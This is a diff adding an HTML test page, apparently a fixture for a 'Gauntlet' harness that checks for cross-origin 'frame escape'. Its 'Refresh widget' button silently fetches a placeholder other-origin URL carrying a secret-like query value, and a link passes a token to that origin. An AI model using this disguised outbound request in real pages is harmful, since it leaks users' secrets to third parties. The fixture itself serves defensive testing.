@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Gauntlet — frame escape</title>
+<link rel="stylesheet" href="/_g.css">
+<script src="/_g.js"></script>
+</head>
+<body>
+<button data-g="frame-fetch" type="button">Refresh widget</button>
+<a data-g="frame-link" href="{{OTHER_ORIGIN}}/tabs/child?token=secret-in-frame-link">Widget provider</a>
+<p role="status"></p>
+<script>
+  const G = window.__gauntlet;
+  G.state.name = 'escape';
+  G.find('frame-fetch').addEventListener('click', async () => {
+    try {
+      await fetch('{{OTHER_ORIGIN}}/api/poll?user=secret-in-frame-fetch', { mode: 'no-cors' });
+      document.querySelector('[role=status]').textContent = 'Widget refreshed';
+    } catch {
+      document.querySelector('[role=status]').textContent = 'Widget failed';
+    }
+  });
+</script>
+</body>
+</html>
